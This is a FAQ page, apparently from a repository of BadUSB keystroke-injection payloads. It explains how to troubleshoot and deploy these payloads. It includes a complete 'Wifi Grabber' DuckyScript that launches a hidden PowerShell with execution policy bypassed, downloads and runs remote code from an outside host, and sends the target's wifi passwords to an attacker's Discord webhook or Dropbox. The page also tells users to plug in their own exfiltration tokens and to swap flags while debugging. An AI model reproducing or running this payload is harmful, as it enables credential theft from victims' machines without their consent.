# FAQ

## 1. The code is executed but the Powershell code just opens and closes and nothing happens

In order for Jakoby or one of his Admin's to properly help you we need to assess and find an error to work with. 

The first step is to replace `-w h` with `-noexit` in your code. This will keep the Powershell window open and display any errors you may have 

Take a screen shot of the error and include it with your help request

<img src="https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/troubleShooting.png" width="1200">

----------------------------------------------------------------------------------------------------------------------------------------

## 2. How do I use a plug and play payload? 

These payloads are designed to make them as easy as possible to use. 
* There is no longer a need to download a copy, modify it, and host somewhere yourself  
* Simply plug in your Dropbox token or Discord webhook into the appropriate variable 

Using the Wifi Grabber payload as an example:
`$dc=''` is for Discord    |    `$db=''` is for Dropbox

```
REM     Title: Wifi Grabber
REM     Author: I am Jakoby
REM     Description: This payload grabs your target's wifi passwords and uploads them to either Dropbox, Discord, or both.
REM     Target: Windows 10, 11

GUI r
DELAY 500
STRING powershell -w h -NoP -Ep Bypass $dc='YOUR-DISCORD-WEBHOOK';$db='YOUR-DROPBOX-TOKEN';iwr jakoby.lol/e8v | iex
ENTER
```

----------------------------------------------------------------------------------------------------------------------------------------

## 3. What is a Dropbox token and how do I use it? 
You can use this video to learn all about it

<p align="left">
      <a href="https://www.youtube.com/watch?v=VPU7dFzpQrM">
        <img src=https://i.ytimg.com/vi/VPU7dFzpQrM/hqdefault.jpg width="500" alt="C#" />
      </a>
</p>

----------------------------------------------------------------------------------------------------------------------------------------

## 4. What is a Discord Webhook and how do I use it? 
You can use this video to learn all about it
<p align="left">
      <a href="https://youtu.be/Zs-1j42ySNU">
        <img src=https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/raw/main/Assets/images/thumbnail.png width="500" alt="C#" />
      </a>
</p>
